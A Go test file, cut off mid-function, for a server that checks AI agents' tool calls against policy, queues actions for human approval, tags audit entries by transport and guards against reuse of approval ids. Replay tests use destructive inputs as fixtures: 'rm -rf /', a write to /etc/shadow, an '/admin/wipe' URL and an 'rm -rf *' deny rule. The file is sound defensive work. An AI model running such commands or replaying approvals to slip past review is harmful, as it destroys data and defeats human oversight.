	if entry.Transport != audit.TransportMCPGateway {
		t.Errorf("Entry.Transport = %q; want %q (from meta)", entry.Transport, audit.TransportMCPGateway)
	}
}

func TestSSEEvent_IncludesTransport(t *testing.T) {
	srv := newTestServer(t)

	ch := srv.approval.Subscribe("local")
	defer srv.approval.Unsubscribe(ch)

	body := `{
		"scope": "shell",
		"command": "ls -la",
		"agent_id": "mcp-gateway:claude-desktop",
		"meta": {"transport": "mcp_gateway"}
	}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	select {
	case ev := <-ch:
		if ev.Type != "check" {
			t.Errorf("event type = %q; want check", ev.Type)
		}
		if ev.Transport != audit.TransportMCPGateway {
			t.Errorf("event.Transport = %q; want %q", ev.Transport, audit.TransportMCPGateway)
		}
	case <-time.After(time.Second):
		t.Fatal("did not receive SSE event within 1s")
	}
}

func TestSSEEvent_ResolveCarriesTransport(t *testing.T) {
	srv := newTestServer(t)

	// 1. Submit a check that triggers REQUIRE_APPROVAL with
	//    transport=mcp_gateway. Drain the "check" event.
	ch := srv.approval.Subscribe("local")
	defer srv.approval.Unsubscribe(ch)

	body := `{
		"scope": "shell",
		"command": "sudo apt install vim",
		"agent_id": "mcp-gateway:claude-desktop",
		"meta": {"transport": "mcp_gateway"}
	}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	var result policy.CheckResult
	if err := json.NewDecoder(w.Body).Decode(&result); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if result.Decision != policy.RequireApproval {
		t.Fatalf("expected REQUIRE_APPROVAL, got %s", result.Decision)
	}

	// Drain the "check" event so the next receive is the "resolved" one.
	select {
	case <-ch:
	case <-time.After(time.Second):
		t.Fatal("missing initial check event")
	}

	// 2. Resolve the approval. The broadcast should preserve
	//    transport=mcp_gateway.
	if err := srv.approval.Resolve(result.ApprovalID, policy.Allow, "local"); err != nil {
		t.Fatalf("Resolve: %v", err)
	}

	select {
	case ev := <-ch:
		if ev.Type != "resolved" {
			t.Errorf("event type = %q; want resolved", ev.Type)
		}
		if ev.Transport != audit.TransportMCPGateway {
			t.Errorf("resolved event.Transport = %q; want %q", ev.Transport, audit.TransportMCPGateway)
		}
	case <-time.After(time.Second):
		t.Fatal("did not receive resolved SSE event within 1s")
	}
}

// TestAuditFilter_Transport writes entries with mixed transports and
// confirms that ?transport=mcp_gateway returns only MCP entries.
func TestAuditFilter_Transport(t *testing.T) {
	srv := newTestServer(t)

	// SDK call (no transport meta).
	srv.handleCheck(httptest.NewRecorder(), httptest.NewRequest(http.MethodPost, "/v1/check",
		strings.NewReader(`{"scope":"shell","command":"ls -la","agent_id":"sdk-bot"}`)))
	// MCP call.
	srv.handleCheck(httptest.NewRecorder(), httptest.NewRequest(http.MethodPost, "/v1/check",
		strings.NewReader(`{"scope":"shell","command":"echo mcp","agent_id":"mcp-gw","meta":{"transport":"mcp_gateway"}}`)))
	// Another SDK call so the test can confirm the SDK filter excludes
	// the MCP entry rather than vacuously matching only one.
	srv.handleCheck(httptest.NewRecorder(), httptest.NewRequest(http.MethodPost, "/v1/check",
		strings.NewReader(`{"scope":"shell","command":"echo sdk","agent_id":"sdk-bot-2"}`)))

	// Filter via the HTTP endpoint to also exercise the query-param
	// plumbing.
	apiReq := httptest.NewRequest(http.MethodGet, "/v1/audit?transport=mcp_gateway&limit=50", nil)
	apiReq.Header.Set("Authorization", "Bearer test-secret")
	apiW := httptest.NewRecorder()
	srv.handleAuditQuery(apiW, apiReq)

	if apiW.Code != http.StatusOK {
		t.Fatalf("audit query status = %d; body = %s", apiW.Code, apiW.Body.String())
	}

	var entries []audit.Entry
	if err := json.NewDecoder(apiW.Body).Decode(&entries); err != nil {
		t.Fatalf("decode entries: %v", err)
	}
	if len(entries) != 1 {
		t.Fatalf("expected 1 mcp_gateway entry, got %d", len(entries))
	}
	if entries[0].Transport != audit.TransportMCPGateway {
		t.Errorf("Entry.Transport = %q; want %q", entries[0].Transport, audit.TransportMCPGateway)
	}

	// And the converse: ?transport=sdk returns the two SDK entries.
	apiReq = httptest.NewRequest(http.MethodGet, "/v1/audit?transport=sdk&limit=50", nil)
	apiReq.Header.Set("Authorization", "Bearer test-secret")
	apiW = httptest.NewRecorder()
	srv.handleAuditQuery(apiW, apiReq)
	if apiW.Code != http.StatusOK {
		t.Fatalf("audit query (sdk) status = %d; body = %s", apiW.Code, apiW.Body.String())
	}
	if err := json.NewDecoder(apiW.Body).Decode(&entries); err != nil {
		t.Fatalf("decode entries (sdk): %v", err)
	}
	if len(entries) != 2 {
		t.Fatalf("expected 2 sdk entries, got %d", len(entries))
	}
	for _, e := range entries {
		if got := e.EffectiveTransport(); got != audit.TransportSDK {
			t.Errorf("entry %q has EffectiveTransport %q; want %q", e.AgentID, got, audit.TransportSDK)
		}
	}
}

// TestDashboard_RenderTransportChip is a smoke check that the
// embedded dashboard HTML carries the transport-chip CSS classes
// and the JS code path that renders them. This is a string-level
// assertion (we don't run a browser); regressions here mean the
// chip stops rendering, which is operationally visible.
func TestDashboard_RenderTransportChip(t *testing.T) {
	required := []string{
		// CSS class names for the three known transports + the
		// neutral fallback.
		".transport-chip.sdk",
		".transport-chip.mcp_gateway",
		".transport-chip.llm_api_proxy",
		".transport-chip.unknown",
		// Legend in the header.
		"transport-legend",
		// JS code path that constructs the chip element. We assert
		// on the constant name rather than the chip-class string
		// because the latter appears verbatim in CSS too.
		"KNOWN_TRANSPORTS",
		// The fallback that protects pre-v0.5 audit entries from
		// rendering as the literal word "undefined".
		"entry.transport || 'sdk'",
	}
	for _, marker := range required {
		if !strings.Contains(dashboardHTML, marker) {
			t.Errorf("dashboardHTML missing marker %q (transport-chip rendering broken)", marker)
		}
	}
}

// TestHandleCheck_TransportPassesThroughUnknownValues confirms a
// caller stamping a value the server doesn't recognise (e.g. a
// future "azure_ai_proxy") is preserved verbatim on the entry.
// Validation is intentionally NOT done at the proxy layer — the
// dashboard renders unknown values with a neutral chip class.
func TestHandleCheck_TransportPassesThroughUnknownValues(t *testing.T) {
	srv := newTestServer(t)

	body := `{
		"scope": "shell",
		"command": "ls -la",
		"agent_id": "future-bot",
		"meta": {"transport": "azure_ai_proxy"}
	}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	entry := readLatestAuditEntry(t, srv)
	if entry.Transport != "azure_ai_proxy" {
		t.Errorf("Entry.Transport = %q; want passthrough %q", entry.Transport, "azure_ai_proxy")
	}
}

// TestTransportFromRequest_UnitTable covers the helper directly so
// future refactors don't accidentally drop the SDK default.
func TestTransportFromRequest_UnitTable(t *testing.T) {
	cases := []struct {
		name string
		meta map[string]string
		want string
	}{
		{"nil meta defaults sdk", nil, audit.TransportSDK},
		{"empty meta defaults sdk", map[string]string{}, audit.TransportSDK},
		{"empty value defaults sdk", map[string]string{"transport": ""}, audit.TransportSDK},
		{"explicit mcp", map[string]string{"transport": "mcp_gateway"}, audit.TransportMCPGateway},
		{"explicit llm", map[string]string{"transport": "llm_api_proxy"}, audit.TransportLLMAPIProxy},
		{"unknown passthrough", map[string]string{"transport": "future"}, "future"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := transportFromRequest(policy.ActionRequest{Meta: tc.meta})
			if got != tc.want {
				t.Errorf("transportFromRequest(meta=%v) = %q; want %q", tc.meta, got, tc.want)
			}
		})
	}
}

// --- /v1/check approval-id round-trip (A19b) ---
//
// When a model retries a tool call after a human resolved the
// approval on the dashboard, the gateway propagates the original
// approval_id (carried through MCP `_meta.dev.agentguard/approval_id`
// or the SDK's equivalent). The server consults the approval queue
// before running policy and short-circuits to the human's decision
// rather than producing a fresh REQUIRE_APPROVAL entry. These tests
// pin the four code paths: ALLOW short-circuit, DENY short-circuit,
// still-pending pass-through, and unknown-id fall-through. Plus a
// unit test for ApprovalQueue.Lookup's read-only contract.

// seedApproval drives a /v1/check that the test policy requires-approval
// for and returns the resulting approval id. Convenience for the
// round-trip tests below — keeps each test focused on the retry leg.
func seedApproval(t *testing.T, srv *Server) string {
	t.Helper()
	body := `{"scope":"shell","command":"sudo apt install vim"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	var result policy.CheckResult
	if err := json.NewDecoder(w.Body).Decode(&result); err != nil {
		t.Fatalf("seed: decode: %v", err)
	}
	if result.Decision != policy.RequireApproval {
		t.Fatalf("seed: expected REQUIRE_APPROVAL, got %s (reason=%s)", result.Decision, result.Reason)
	}
	if result.ApprovalID == "" {
		t.Fatal("seed: empty approval_id")
	}
	return result.ApprovalID
}

func TestHandleCheck_ApprovalIDResolved_AllowShortCircuits(t *testing.T) {
	srv := newTestServer(t)

	approvalID := seedApproval(t, srv)
	queueSizeBefore := len(srv.approval.pending)

	// Human approves on the dashboard.
	if err := srv.approval.Resolve(approvalID, policy.Allow, "local"); err != nil {
		t.Fatalf("Resolve: %v", err)
	}

	// Model retries with approval_id propagated.
	body := fmt.Sprintf(`{"scope":"shell","command":"sudo apt install vim","approval_id":%q}`, approvalID)
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var result policy.CheckResult
	if err := json.NewDecoder(w.Body).Decode(&result); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if result.Decision != policy.Allow {
		t.Errorf("retry decision = %s; want ALLOW (rule=%s reason=%s)", result.Decision, result.Rule, result.Reason)
	}
	if result.Rule != "allow:approved" {
		t.Errorf("retry rule = %q; want allow:approved", result.Rule)
	}
	if result.ApprovalID != approvalID {
		t.Errorf("retry approval_id = %q; want %q (the original)", result.ApprovalID, approvalID)
	}

	if got := len(srv.approval.pending); got != queueSizeBefore {
		t.Errorf("queue size grew: before=%d after=%d (no new entry should have been created)", queueSizeBefore, got)
	}
}

func TestHandleCheck_ApprovalIDResolved_DenyShortCircuits(t *testing.T) {
	srv := newTestServer(t)

	approvalID := seedApproval(t, srv)
	queueSizeBefore := len(srv.approval.pending)

	if err := srv.approval.Resolve(approvalID, policy.Deny, "local"); err != nil {
		t.Fatalf("Resolve: %v", err)
	}

	body := fmt.Sprintf(`{"scope":"shell","command":"sudo apt install vim","approval_id":%q}`, approvalID)
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	var result policy.CheckResult
	if err := json.NewDecoder(w.Body).Decode(&result); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if result.Decision != policy.Deny {
		t.Errorf("retry decision = %s; want DENY", result.Decision)
	}
	if result.Rule != "deny:approved" {
		t.Errorf("retry rule = %q; want deny:approved", result.Rule)
	}
	if result.ApprovalID != approvalID {
		t.Errorf("retry approval_id = %q; want %q", result.ApprovalID, approvalID)
	}

	if got := len(srv.approval.pending); got != queueSizeBefore {
		t.Errorf("queue size grew: before=%d after=%d", queueSizeBefore, got)
	}
}

func TestHandleCheck_ApprovalIDStillPending_ReturnsExistingApproval(t *testing.T) {
	srv := newTestServer(t)

	approvalID := seedApproval(t, srv)
	queueSizeBefore := len(srv.approval.pending)

	// Retry BEFORE the human resolves. Server should return the SAME
	// approval id back (no fresh entry) so the client can keep waiting.
	body := fmt.Sprintf(`{"scope":"shell","command":"sudo apt install vim","approval_id":%q}`, approvalID)
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	var result policy.CheckResult
	if err := json.NewDecoder(w.Body).Decode(&result); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if result.Decision != policy.RequireApproval {
		t.Errorf("retry decision = %s; want REQUIRE_APPROVAL (still pending)", result.Decision)
	}
	if result.Rule != "require_approval:pending" {
		t.Errorf("retry rule = %q; want require_approval:pending", result.Rule)
	}
	if result.ApprovalID != approvalID {
		t.Errorf("retry approval_id = %q; want %q (the SAME id, not a new one)", result.ApprovalID, approvalID)
	}
	if result.ApprovalURL == "" {
		t.Error("retry should reuse the existing approval URL so polling clients keep working")
	}

	if got := len(srv.approval.pending); got != queueSizeBefore {
		t.Errorf("queue size grew: before=%d after=%d", queueSizeBefore, got)
	}
}

func TestHandleCheck_ApprovalIDUnknown_FallsThrough(t *testing.T) {
	srv := newTestServer(t)

	// Bogus approval_id, but the underlying command is policy-allowed.
	// The server must fall through to fresh evaluation (not 404), so the
	// caller still gets a correct policy decision.
	body := `{"scope":"shell","command":"ls -la","approval_id":"ap_bogus_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	var result policy.CheckResult
	if err := json.NewDecoder(w.Body).Decode(&result); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if result.Decision != policy.Allow {
		t.Errorf("decision = %s; want ALLOW (bogus approval_id should not block normal evaluation)", result.Decision)
	}
	if result.Rule == "allow:approved" {
		t.Errorf("bogus approval_id should NOT short-circuit; rule = %q", result.Rule)
	}
}

func TestHandleCheck_ApprovalIDEmpty_FallsThrough(t *testing.T) {
	srv := newTestServer(t)

	// Body has no approval_id at all (legacy SDK shape). Confirms the
	// short-circuit doesn't accidentally fire when the field is empty.
	body := `{"scope":"shell","command":"ls -la"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	var result policy.CheckResult
	if err := json.NewDecoder(w.Body).Decode(&result); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if result.Decision != policy.Allow {
		t.Errorf("decision = %s; want ALLOW", result.Decision)
	}
}

func TestApprovalQueue_LookupIsReadOnly(t *testing.T) {
	q := &ApprovalQueue{
		pending: make(map[string]*PendingAction),
		maxSize: MaxPendingApprovals,
	}
	pa, err := q.Add(policy.ActionRequest{Scope: "shell", Command: "sudo true"},
		policy.CheckResult{Decision: policy.RequireApproval, Reason: "test"}, "local")
	if err != nil {
		t.Fatalf("Add: %v", err)
	}

	got, ok := q.Lookup(pa.ID, "local")
	if !ok {
		t.Fatalf("Lookup(%s) = false; want true", pa.ID)
	}
	if got.ID != pa.ID {
		t.Errorf("Lookup ID = %q; want %q", got.ID, pa.ID)
	}

	// Mutate the returned struct. The queue's internal entry must NOT
	// observe the change — Lookup returns a defensive copy.
	got.Resolved = true
	got.Decision = "ALLOW"
	got.Request.Command = "rm -rf /"

	q.mu.RLock()
	internal := q.pending[pa.ID]
	q.mu.RUnlock()
	if internal.Resolved {
		t.Error("internal entry was mutated via Lookup return value (Resolved=true)")
	}
	if internal.Decision != "" {
		t.Errorf("internal entry Decision = %q; want empty (caller mutated copy bled through)", internal.Decision)
	}
	if internal.Request.Command != "sudo true" {
		t.Errorf("internal entry Command = %q; want %q", internal.Request.Command, "sudo true")
	}

	if _, ok := q.Lookup("ap_does_not_exist", "local"); ok {
		t.Error("Lookup of unknown id returned ok=true")
	}
}

// TestHandleCheck_ApprovalIDResolved_PreservesTransport — the audit
// entry written for a resolved-approval round-trip must carry the
// retry request's transport tag, NOT default to "sdk". A real MCP
// gateway re-stamps `meta["transport"] = "mcp_gateway"` on the retry,
// so investigators querying `transport=mcp_gateway` see both the
// original REQUIRE_APPROVAL entry and the resolved-approved entry.
func TestHandleCheck_ApprovalIDResolved_PreservesTransport(t *testing.T) {
	srv := newTestServer(t)

	// 1. First call from the gateway — REQUIRE_APPROVAL entry is
	//    written with transport=mcp_gateway.
	body1 := `{
		"scope": "shell",
		"command": "sudo apt install vim",
		"agent_id": "mcp-gateway:claude-desktop",
		"meta": {"transport": "mcp_gateway"}
	}`
	w1 := httptest.NewRecorder()
	srv.handleCheck(w1, httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body1)))

	var first policy.CheckResult
	if err := json.NewDecoder(w1.Body).Decode(&first); err != nil {
		t.Fatalf("decode first: %v", err)
	}
	if first.Decision != policy.RequireApproval {
		t.Fatalf("first decision = %s; want REQUIRE_APPROVAL", first.Decision)
	}
	approvalID := first.ApprovalID

	// 2. Operator approves.
	if err := srv.approval.Resolve(approvalID, policy.Allow, "local"); err != nil {
		t.Fatalf("Resolve: %v", err)
	}

	// 3. Gateway retries with approval_id + the same transport stamp.
	body2 := fmt.Sprintf(`{
		"scope": "shell",
		"command": "sudo apt install vim",
		"agent_id": "mcp-gateway:claude-desktop",
		"approval_id": %q,
		"meta": {"transport": "mcp_gateway"}
	}`, approvalID)
	w2 := httptest.NewRecorder()
	srv.handleCheck(w2, httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body2)))

	var second policy.CheckResult
	if err := json.NewDecoder(w2.Body).Decode(&second); err != nil {
		t.Fatalf("decode second: %v", err)
	}
	if second.Decision != policy.Allow || second.Rule != "allow:approved" {
		t.Fatalf("second decision/rule = %s/%q; want ALLOW/allow:approved", second.Decision, second.Rule)
	}

	// 4. The resolved-approved audit entry must be tagged
	//    transport=mcp_gateway (inherited from the retry request's
	//    meta), not the default "sdk" bucket.
	entries, err := srv.cfg.Logger.Query(audit.QueryFilter{
		Transport: audit.TransportMCPGateway,
	})
	if err != nil {
		t.Fatalf("Query: %v", err)
	}
	var sawApproved bool
	for _, e := range entries {
		if e.Result.Rule == "allow:approved" && e.EffectiveTransport() == audit.TransportMCPGateway {
			sawApproved = true
			break
		}
	}
	if !sawApproved {
		t.Errorf("no audit entry with rule=allow:approved + transport=mcp_gateway; entries=%d", len(entries))
	}
}

// --- /v1/check approval-id REPLAY guard (B1) ---
//
// /v1/check is intentionally unauthenticated; approval ids leak through
// audit logs, SSE feeds, webhook payloads, and refusal text echoed to
// the model. Without request-shape binding, anyone who learns an
// approved id can replay it against ANY action and short-circuit to
// ALLOW. The fix (matchesOriginalRequest) compares operationally-
// meaningful fields between the retry and the original PendingAction
// and falls through to fresh Engine.Check on mismatch.
//
// The tests below pin one mismatch dimension each, plus a sanity
// regression test for the legitimate-retry path. See V05 audit B1
// (R-Sec H1, R-Stub C3).

// newReplayTestServer builds a test server with a richer policy than
// newTestServer's default — adds filesystem and network rules with
// require_approval entries so we can exercise per-scope path/url
// mismatches without running into the default-deny fallback.
func newReplayTestServer(t *testing.T) *Server {
	t.Helper()
	return newTestServer(t, func(cfg *Config) {
		pol := &policy.Policy{
			Version: "1",
			Name:    "test-policy-replay",
			Rules: []policy.RuleSet{
				{
					Scope:           "shell",
					Allow:           []policy.Rule{{Pattern: "ls *"}, {Pattern: "echo *"}},
					Deny:            []policy.Rule{{Pattern: "rm -rf *", Message: "Destructive command blocked"}},
					RequireApproval: []policy.Rule{{Pattern: "sudo *"}},
				},
				{
					Scope: "filesystem",
					Allow: []policy.Rule{
						{Action: "read", Paths: []string{"/tmp/**"}},
					},
					RequireApproval: []policy.Rule{
						{Action: "write", Paths: []string{"/etc/**"}},
					},
				},
				{
					Scope:           "network",
					Allow:           []policy.Rule{{Domain: "api.openai.com"}},
					RequireApproval: []policy.Rule{{Domain: "*.example.com"}},
				},
			},
		}
		cfg.Engine = policy.NewEngineFromPolicy(pol)
	})
}

// seedReplayApproval drives a /v1/check whose body matches `body` and
// asserts a REQUIRE_APPROVAL is created; returns the approval id.
func seedReplayApproval(t *testing.T, srv *Server, body string) string {
	t.Helper()
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	var result policy.CheckResult
	if err := json.NewDecoder(w.Body).Decode(&result); err != nil {
		t.Fatalf("seed: decode: %v", err)
	}
	if result.Decision != policy.RequireApproval {
		t.Fatalf("seed: expected REQUIRE_APPROVAL, got %s (rule=%s reason=%s)", result.Decision, result.Rule, result.Reason)
	}
	if result.ApprovalID == "" {
		t.Fatal("seed: empty approval_id")
	}
	if err := srv.approval.Resolve(result.ApprovalID, policy.Allow, "local"); err != nil {
		t.Fatalf("seed: Resolve: %v", err)
	}
	return result.ApprovalID
}

// retryCheck drives a /v1/check with the given body and returns the
// decoded CheckResult plus the raw response code.
func retryCheck(t *testing.T, srv *Server, body string) (policy.CheckResult, int) {
	t.Helper()
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)
	var result policy.CheckResult
	if err := json.NewDecoder(w.Body).Decode(&result); err != nil {
		t.Fatalf("retry: decode: %v", err)
	}
	return result, w.Code
}

// assertNotShortCircuited asserts that the result did NOT come from the
// approval-cache short-circuit path (i.e. rule != "allow:approved" and
// != "deny:approved"). This is the load-bearing assertion for every
// replay test — fall-through to Engine.Check is the security property.
func assertNotShortCircuited(t *testing.T, result policy.CheckResult) {
	t.Helper()
	switch result.Rule {
	case "allow:approved", "deny:approved", "deny:approved:invalid_resolution", "require_approval:pending":
		t.Errorf("approval-id replay was short-circuited (rule=%q decision=%s) — request-shape validator failed",
			result.Rule, result.Decision)
	}
}

func TestHandleCheck_ApprovalIDReplay_DifferentAgent_FallsThrough(t *testing.T) {
	srv := newReplayTestServer(t)

	// Approve an action FOR agent_a.
	approvalID := seedReplayApproval(t, srv,
		`{"scope":"shell","command":"sudo apt install vim","agent_id":"agent_a"}`)

	mismatchBefore := atomic.LoadUint64(&metrics.ApprovalReplayMismatchTotal)

	// agent_b replays the same id against the same command. Must NOT
	// short-circuit; the policy still says REQUIRE_APPROVAL for agent_b.
	body := fmt.Sprintf(`{"scope":"shell","command":"sudo apt install vim","agent_id":"agent_b","approval_id":%q}`, approvalID)
	result, code := retryCheck(t, srv, body)

	if code != http.StatusOK {
		t.Fatalf("expected 200, got %d", code)
	}
	assertNotShortCircuited(t, result)
	if result.Decision == policy.Allow {
		t.Errorf("decision = ALLOW; replay should NOT auto-allow for a different agent (rule=%q reason=%q)", result.Rule, result.Reason)
	}
	// The fresh evaluation under the test policy yields REQUIRE_APPROVAL
	// (sudo * → require_approval), confirming the request was actually
	// re-evaluated.
	if result.Decision != policy.RequireApproval {
		t.Errorf("decision = %s; want REQUIRE_APPROVAL (fresh evaluation)", result.Decision)
	}
	if got := atomic.LoadUint64(&metrics.ApprovalReplayMismatchTotal); got <= mismatchBefore {
		t.Errorf("ApprovalReplayMismatchTotal = %d; want > %d (security signal not incremented)", got, mismatchBefore)
	}
}

func TestHandleCheck_ApprovalIDReplay_DifferentScope_FallsThrough(t *testing.T) {
	srv := newReplayTestServer(t)

	// Approve a shell action.
	approvalID := seedReplayApproval(t, srv,
		`{"scope":"shell","command":"sudo apt install vim","agent_id":"agent_a"}`)

	mismatchBefore := atomic.LoadUint64(&metrics.ApprovalReplayMismatchTotal)

	// Replay against the network scope (with the same other fields).
	// Network scope has no rule for command="sudo apt install vim", so
	// fresh evaluation yields default-deny.
	body := fmt.Sprintf(`{"scope":"network","command":"sudo apt install vim","agent_id":"agent_a","approval_id":%q}`, approvalID)
	result, _ := retryCheck(t, srv, body)

	assertNotShortCircuited(t, result)
	if result.Decision == policy.Allow {
		t.Errorf("decision = ALLOW; replay across scopes must not auto-allow (rule=%q)", result.Rule)
	}
	if got := atomic.LoadUint64(&metrics.ApprovalReplayMismatchTotal); got <= mismatchBefore {
		t.Errorf("ApprovalReplayMismatchTotal not incremented on scope mismatch")
	}
}

func TestHandleCheck_ApprovalIDReplay_DifferentCommand_FallsThrough(t *testing.T) {
	srv := newReplayTestServer(t)

	// Operator approves `sudo apt install vim`.
	approvalID := seedReplayApproval(t, srv,
		`{"scope":"shell","command":"sudo apt install vim","agent_id":"agent_a"}`)

	mismatchBefore := atomic.LoadUint64(&metrics.ApprovalReplayMismatchTotal)

	// Attacker replays the id with `rm -rf /`. The approval was for a
	// different command; the cache must NOT honour it, and the policy's
	// `rm -rf *` deny rule must fire instead.
	body := fmt.Sprintf(`{"scope":"shell","command":"rm -rf /","agent_id":"agent_a","approval_id":%q}`, approvalID)
	result, _ := retryCheck(t, srv, body)

	assertNotShortCircuited(t, result)
	if result.Decision != policy.Deny {
		t.Errorf("decision = %s; want DENY (rm -rf * is denied; replay must not bypass)", result.Decision)
	}
	if got := atomic.LoadUint64(&metrics.ApprovalReplayMismatchTotal); got <= mismatchBefore {
		t.Errorf("ApprovalReplayMismatchTotal not incremented on command mismatch")
	}
}

func TestHandleCheck_ApprovalIDReplay_DifferentPath_FallsThrough(t *testing.T) {
	srv := newReplayTestServer(t)

	// Approve a write to /etc/hosts.
	approvalID := seedReplayApproval(t, srv,
		`{"scope":"filesystem","action":"write","path":"/etc/hosts","agent_id":"agent_a"}`)

	mismatchBefore := atomic.LoadUint64(&metrics.ApprovalReplayMismatchTotal)

	// Replay the id against /etc/shadow. Different path → must NOT
	// short-circuit. /etc/shadow matches the same require_approval rule
	// (Action=write, Paths=/etc/**), so fresh evaluation yields a fresh
	// REQUIRE_APPROVAL — distinct from the cached "allow:approved".
	body := fmt.Sprintf(`{"scope":"filesystem","action":"write","path":"/etc/shadow","agent_id":"agent_a","approval_id":%q}`, approvalID)
	result, _ := retryCheck(t, srv, body)

	assertNotShortCircuited(t, result)
	if result.Decision == policy.Allow {
		t.Errorf("decision = ALLOW; path-mismatched replay must not auto-allow (rule=%q)", result.Rule)
	}
	if got := atomic.LoadUint64(&metrics.ApprovalReplayMismatchTotal); got <= mismatchBefore {
		t.Errorf("ApprovalReplayMismatchTotal not incremented on path mismatch")
	}
}

func TestHandleCheck_ApprovalIDReplay_DifferentURL_FallsThrough(t *testing.T) {
	srv := newReplayTestServer(t)

	// Approve a network call to api.example.com with a specific URL.
	approvalID := seedReplayApproval(t, srv,
		`{"scope":"network","domain":"api.example.com","url":"https://api.example.com/safe","agent_id":"agent_a"}`)

	mismatchBefore := atomic.LoadUint64(&metrics.ApprovalReplayMismatchTotal)

	// Replay the id with a different URL on the same domain.
	body := fmt.Sprintf(`{"scope":"network","domain":"api.example.com","url":"https://api.example.com/admin/wipe","agent_id":"agent_a","approval_id":%q}`, approvalID)
	result, _ := retryCheck(t, srv, body)

	assertNotShortCircuited(t, result)
	if result.Decision == policy.Allow {
		t.Errorf("decision = ALLOW; URL-mismatched replay must not auto-allow (rule=%q)", result.Rule)
	}
	if got := atomic.LoadUint64(&metrics.ApprovalReplayMismatchTotal); got <= mismatchBefore {
		t.Errorf("ApprovalReplayMismatchTotal not incremented on URL mismatch")
	}
}

func TestHandleCheck_ApprovalIDValidRetry_SameRequestStillShortCircuits(t *testing.T) {
	srv := newReplayTestServer(t)

	// Approve and immediately retry with the SAME shape. The legitimate
	// retry path must continue to short-circuit (this is the whole
	// reason A19b exists; the B1 fix must not break it).
	approvalID := seedReplayApproval(t, srv,
		`{"scope":"shell","command":"sudo apt install vim","agent_id":"agent_a"}`)

	mismatchBefore := atomic.LoadUint64(&metrics.ApprovalReplayMismatchTotal)

	body := fmt.Sprintf(`{"scope":"shell","command":"sudo apt install vim","agent_id":"agent_a","approval_id":%q}`, approvalID)
	result, code := retryCheck(t, srv, body)

	if code != http.StatusOK {
		t.Fatalf("expected 200, got %d", code)
	}
	if result.Decision != policy.Allow {
		t.Errorf("decision = %s; want ALLOW (legitimate retry must still short-circuit) rule=%q", result.Decision, result.Rule)
	}
	if result.Rule != "allow:approved" {
		t.Errorf("rule = %q; want allow:approved (legitimate retry path)", result.Rule)
	}
	if result.ApprovalID != approvalID {
		t.Errorf("approval_id = %q; want %q (the original)", result.ApprovalID, approvalID)
	}
	if got := atomic.LoadUint64(&metrics.ApprovalReplayMismatchTotal); got != mismatchBefore {
		t.Errorf("ApprovalReplayMismatchTotal = %d; want %d (legitimate retry must NOT bump the security signal)", got, mismatchBefore)
	}
}

// TestHandleCheck_ApprovalIDValidRetry_NonAuthorisingFieldsDrift confirms
// that Meta / SessionID / EstCost / SchemaVersion legitimately drift on
// retry without breaking the short-circuit. Pins the matchesOriginalRequest
// negative-space contract documented next to the helper.
func TestHandleCheck_ApprovalIDValidRetry_NonAuthorisingFieldsDrift(t *testing.T) {
	srv := newReplayTestServer(t)

	approvalID := seedReplayApproval(t, srv,
		`{"scope":"shell","command":"sudo apt install vim","agent_id":"agent_a","session_id":"sess1","meta":{"transport":"sdk"}}`)

	// Retry with a different session_id and different meta but
	// identical authorising fields. Must short-circuit.
	body := fmt.Sprintf(`{"scope":"shell","command":"sudo apt install vim","agent_id":"agent_a","session_id":"sess2","meta":{"transport":"mcp_gateway","arg_url":"https://x.example/y"},"approval_id":%q}`, approvalID)
	result, _ := retryCheck(t, srv, body)

	if result.Rule != "allow:approved" {
		t.Errorf("rule = %q; want allow:approved (session_id/meta drift must not break the cache)", result.Rule)
	}
}

// TestHandleCheck_ApprovalIDReplay_LogsMismatchSignal verifies that on
// a mismatch the security signal — the package-level metric counter —
// is incremented. A non-zero rate is the operator-facing alert that
// either a buggy gateway or a deliberate replay attempt is happening.
func TestHandleCheck_ApprovalIDReplay_LogsMismatchSignal(t *testing.T) {
	srv := newReplayTestServer(t)

	approvalID := seedReplayApproval(t, srv,
